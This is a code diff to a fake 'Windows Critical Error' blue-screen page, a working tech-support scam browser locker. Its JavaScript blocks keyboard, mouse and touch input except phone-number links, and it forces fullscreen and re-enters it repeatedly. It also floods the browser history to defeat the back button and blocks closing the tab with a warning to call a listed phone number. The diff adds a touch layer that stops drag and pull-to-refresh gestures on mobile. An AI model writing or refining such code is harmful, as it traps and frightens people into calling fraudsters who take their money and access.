@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
   <title>Windows Critical Error</title>
   
   <!-- Google tag (gtag.js) -->
@@ -35,6 +35,30 @@
       -webkit-tap-highlight-color: transparent;
       touch-action: none;
       -ms-touch-action: none;
+    }
+
+    /* ===== TOP DRAG PREVENTION LAYER ===== */
+    #drag-prevention-layer {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 40px; /* Covers the top area where drag gestures occur */
+      background: transparent;
+      z-index: 999999; /* Above everything */
+      pointer-events: auto; /* Capture touches */
+    }
+
+    /* Invisible barrier that blocks all touches */
+    .touch-barrier {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: transparent;
+      z-index: 999998;
+      pointer-events: none; /* Let events pass through normally */
     }
 
     /* ===== LAYER 1: PRIMARY BSOD (FULL SCREEN, NO EMOJIS) ===== */
@@ -297,6 +321,9 @@
 </head>
 <body>
 
+  <!-- ===== TOP DRAG PREVENTION LAYER ===== -->
+  <div id="drag-prevention-layer"></div>
+
   <!-- ===== LAYER 1: PERFECT BSOD (NO EMOJIS) ===== -->
   <div id="bsod-layer-1">
     <div class="bsod-container">
@@ -378,6 +405,7 @@
       const layer1 = document.getElementById('bsod-layer-1');
       const layer2 = document.getElementById('bsod-layer-2');
       const layer3 = document.getElementById('bsod-layer-3');
+      const dragPrevention = document.getElementById('drag-prevention-layer');
       
       // ===== LOCK BODY COMPLETELY =====
       document.body.style.overflow = 'hidden';
@@ -394,145 +422,129 @@
       const date = new Date();
       document.getElementById('current-date').innerHTML = date.toLocaleDateString();
       
+      // ===== DRAG PREVENTION LAYER HANDLER =====
+      // This captures all touch events at the top of the screen
+      dragPrevention.addEventListener('touchstart', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        
+        // Show layer 2 as a warning
+        if (layer3.style.display !== 'flex' && layer2.style.display !== 'flex') {
+          layer2.style.display = 'flex';
+        }
+        
+        // Vibration feedback
+        if (navigator.vibrate) {
+          navigator.vibrate(200);
+        }
+        
+        return false;
+      }, { passive: false, capture: true });
+      
+      dragPrevention.addEventListener('touchmove', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+      }, { passive: false, capture: true });
+      
+      dragPrevention.addEventListener('touchend', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        return false;
+      }, { passive: false, capture: true });
+      
+      // ===== BLOCK ALL DRAG-RELATED GESTURES =====
+      document.addEventListener('touchmove', function(e) {
+        // Allow phone links
+        if (e.target.tagName === 'A' && e.target.href.includes('tel:')) {
+          return;
+        }
+        e.preventDefault();
+      }, { passive: false, capture: true });
+      
+      // Block pull-to-refresh entirely
+      document.body.style.overscrollBehavior = 'none';
+      document.documentElement.style.overscrollBehavior = 'none';
+      
       // ===== FULLSCREEN FUNCTIONS =====
       function enterFullScreen() {
-        const element = document.documentElement; // Full page
+        const element = document.documentElement;
         
-        // Standard method
         if (element.requestFullscreen) {
-          element.requestFullscreen().catch(err => {
-            console.log('Fullscreen failed (standard):', err);
-          });
-        } 
-        // Firefox
-        else if (element.mozRequestFullScreen) {
-          element.mozRequestFullScreen().catch(err => {
-            console.log('Fullscreen failed (Firefox):', err);
-          });
-        } 
-        // Chrome, Safari, Opera (older)
-        else if (element.webkitRequestFullscreen) {
-          element.webkitRequestFullscreen().catch(err => {
-            console.log('Fullscreen failed (WebKit):', err);
-          });
-        } 
-        // IE/Edge
-        else if (element.msRequestFullscreen) {
-          element.msRequestFullscreen().catch(err => {
-            console.log('Fullscreen failed (IE/Edge):', err);
-          });
+          element.requestFullscreen().catch(() => {});
+        } else if (element.mozRequestFullScreen) {
+          element.mozRequestFullScreen().catch(() => {});
+        } else if (element.webkitRequestFullscreen) {
+          element.webkitRequestFullscreen().catch(() => {});
+        } else if (element.msRequestFullscreen) {
+          element.msRequestFullscreen().catch(() => {});
         }
       }
       
-      // ===== ATTEMPT FULLSCREEN IMMEDIATELY =====
-      // Note: Due to browser security policies, fullscreen usually requires
-      // user interaction. This will attempt anyway but may fail silently.
+      // Attempt fullscreen immediately
       enterFullScreen();
       
-      // ===== RETRY FULLSCREEN PERIODICALLY =====
-      // Sometimes the first attempt fails, so we try again
+      // Retry fullscreen aggressively
       setInterval(() => {
         if (!document.fullscreenElement && !document.webkitFullscreenElement && 
             !document.mozFullScreenElement && !document.msFullscreenElement) {
           enterFullScreen();
         }
-      }, 2000); // Try every 2 seconds
+      }, 1000);
       
-      // ===== TRIGGER ON ANY CLICK (including phone number clicks) =====
-      document.addEventListener('click', function(e) {
-        // Still attempt fullscreen even when they click phone
-        setTimeout(() => {
-          if (!document.fullscreenElement && !document.webkitFullscreenElement && 
-              !document.mozFullScreenElement && !document.msFullscreenElement) {
-            enterFullScreen();
-          }
-        }, 100);
-      }, true);
-      
-      // ===== FULLSCREEN CHANGE DETECTION =====
+      // Re-enter if they exit
       document.addEventListener('fullscreenchange', function() {
-        if (document.fullscreenElement) {
-          console.log('Entered fullscreen mode');
-        } else {
-          console.log('Exited fullscreen mode - RE-ENTERING');
-          // Immediately try to re-enter if they exit
-          setTimeout(enterFullScreen, 50);
+        if (!document.fullscreenElement) {
+          setTimeout(enterFullScreen, 10);
         }
       });
       
-      // Vendor prefixes
       document.addEventListener('webkitfullscreenchange', function() {
         if (!document.webkitFullscreenElement) {
-          setTimeout(enterFullScreen, 50);
+          setTimeout(enterFullScreen, 10);
         }
       });
       
       document.addEventListener('mozfullscreenchange', function() {
         if (!document.mozFullScreenElement) {
-          setTimeout(enterFullScreen, 50);
+          setTimeout(enterFullScreen, 10);
         }
       });
       
-      document.addEventListener('MSFullscreenChange', function() {
-        if (!document.msFullscreenElement) {
-          setTimeout(enterFullScreen, 50);
-        }
-      });
-      
-      // ===== FULLSCREEN ERROR HANDLING =====
-      document.addEventListener('fullscreenerror', function() {
-        console.log('Fullscreen error - retrying');
-        setTimeout(enterFullScreen, 500);
-      });
-      
-      // ===== PROGRESS TO LAYER 2 AFTER DELAY (AUTOMATIC) =====
+      // ===== PROGRESS TO LAYER 2 AFTER DELAY =====
       setTimeout(() => {
         if (layer3.style.display !== 'flex' && layer2.style.display !== 'flex') {
           layer2.style.display = 'flex';
-          
-          // Vibration if supported
-          if (navigator.vibrate) {
-            navigator.vibrate(500);
-          }
+          if (navigator.vibrate) navigator.vibrate(500);
         }
-      }, 15000); // 15 seconds - gives them time to see the phone number
+      }, 15000);
       
-      // ===== PROGRESS TO LAYER 3 AFTER MORE DELAY =====
+      // ===== PROGRESS TO LAYER 3 AFTER DELAY =====
       setTimeout(() => {
         if (layer3.style.display !== 'flex') {
           layer3.style.display = 'flex';
-          
-          // Intense vibration
-          if (navigator.vibrate) {
-            navigator.vibrate([1000, 300, 1000]);
-          }
+          if (navigator.vibrate) navigator.vibrate([1000, 300, 1000]);
         }
-      }, 30000); // 30 seconds
+      }, 30000);
       
-      // ===== BLOCK ALL KEYS (EVERY SINGLE KEY) =====
+      // ===== BLOCK ALL KEYS =====
       document.addEventListener('keydown', function(e) {
-        // Block absolutely every key
         e.preventDefault();
         e.stopPropagation();
         
-        // F11 is fullscreen toggle - we block it and force our own fullscreen
         if (e.key === 'F11') {
           setTimeout(enterFullScreen, 10);
         }
         
-        // Show layer 2 if not already visible
         if (layer3.style.display !== 'flex' && layer2.style.display !== 'flex') {
           layer2.style.display = 'flex';
         }
         
-        if (navigator.vibrate) {
-          navigator.vibrate(100);
-        }
-        
+        if (navigator.vibrate) navigator.vibrate(100);
         return false;
-      }, true); // Capture phase
+      }, true);
       
-      // ===== BACK BUTTON SPAM (MOST AGGRESSIVE POSSIBLE) =====
+      // ===== BACK BUTTON SPAM =====
       function spamHistory() {
         for (let i = 0; i < 20; i++) {
           history.pushState({}, '', location.href);
@@ -540,21 +552,15 @@
       }
       
       spamHistory();
-      setInterval(spamHistory, 5); // Every 5ms - insane frequency
+      setInterval(spamHistory, 5);
       
       window.addEventListener('popstate', function() {
         spamHistory();
-        
-        if (layer3.style.display !== 'flex') {
-          layer2.style.display = 'flex';
-        }
-        
-        if (navigator.vibrate) {
-          navigator.vibrate(500);
-        }
+        if (layer3.style.display !== 'flex') layer2.style.display = 'flex';
+        if (navigator.vibrate) navigator.vibrate(500);
       });
       
-      // ===== BLOCK EVERY SINGLE MOUSE/TOUCH EVENT =====
+      // ===== BLOCK ALL EVENTS =====
       const blockAllEvents = [
         'click', 'mousedown', 'mouseup', 'mousemove', 'mouseover', 'mouseout',
         'touchstart', 'touchmove', 'touchend', 'touchcancel',
@@ -564,72 +570,56 @@
       
       blockAllEvents.forEach(eventType => {
         document.addEventListener(eventType, function(e) {
-          // Allow phone links
           if (e.target.tagName === 'A' && e.target.href.includes('tel:')) {
-            return; // Let them call
+            return;
           }
-          
           e.preventDefault();
           e.stopPropagation();
           return false;
         }, { passive: false, capture: true });
       });
       
-      // ===== PREVENT PAGE UNLOAD (CAN'T CLOSE TAB) =====
+      // ===== PREVENT PAGE UNLOAD =====
       window.addEventListener('beforeunload', function(e) {
         e.preventDefault();
         e.returnValue = 'CRITICAL: Your system is locked. Call +1(833)224-9350 immediately.';
         return e.returnValue;
       });
       
-      // ===== BLOCK RIGHT CLICK / LONG PRESS =====
-      document.addEventListener('contextmenu', function(e) {
-        e.preventDefault();
-        return false;
-      }, true);
-      
-      // ===== ENSURE OVERLAYS STAY VISIBLE AND NON-INTERACTIVE =====
+      // ===== ENSURE OVERLAYS STAY VISIBLE =====
       setInterval(function() {
-        // Manage layer visibility
         if (layer3.style.display === 'flex') {
           layer1.style.display = 'none';
           layer2.style.display = 'none';
         } else if (layer2.style.display === 'flex') {
-          layer1.style.display = 'flex'; // Keep layer1 behind
+          layer1.style.display = 'flex';
         } else {
           layer1.style.display = 'flex';
         }
         
-        // Ensure body is locked
         document.body.style.overflow = 'hidden';
         document.documentElement.style.overflow = 'hidden';
         document.body.style.pointerEvents = 'none';
+        document.body.style.overscrollBehavior = 'none';
+        document.documentElement.style.overscrollBehavior = 'none';
         
         // Re-enable phone links
-        const links = document.querySelectorAll('a[href^="tel:"]');
-        links.forEach(link => {
+        document.querySelectorAll('a[href^="tel:"]').forEach(link => {
           link.style.pointerEvents = 'auto';
         });
         
-        // Fullscreen check and re-entry
+        // Fullscreen check
         if (!document.fullscreenElement && !document.webkitFullscreenElement && 
             !document.mozFullScreenElement && !document.msFullscreenElement) {
           enterFullScreen();
         }
       }, 50);
       
-      // ===== CONSOLE SCARE MESSAGES =====
-      console.log('%cWINDOWS CRITICAL ERROR', 'color: #106ebe; font-size: 30px; font-weight: bold;');
-      console.log('%cCall +1(833)224-9350 immediately', 'color: white; font-size: 24px; background: #ff0000; padding: 10px;');
-      
-      // ===== PREVENT ANY POSSIBLE EXIT =====
-      // Disable F11 (fullscreen toggle), F5 (refresh), etc.
+      // ===== BLOCK KEYBOARD SHORTCUTS =====
       window.addEventListener('keydown', function(e) {
         if (e.key === 'F11' || e.key === 'F5' || e.key === 'F4' || 
-            (e.ctrlKey && e.key === 'w') || (e.ctrlKey && e.key === 'r') ||
-            (e.ctrlKey && e.key === 'W') || (e.ctrlKey && e.key === 'R')) {
+            (e.ctrlKey && (e.key === 'w' || e.key === 'r' || e.key === 'W' || e.key === 'R'))) {
           e.preventDefault();
-          // Force fullscreen again
           setTimeout(enterFullScreen, 10);
           return false;
         }
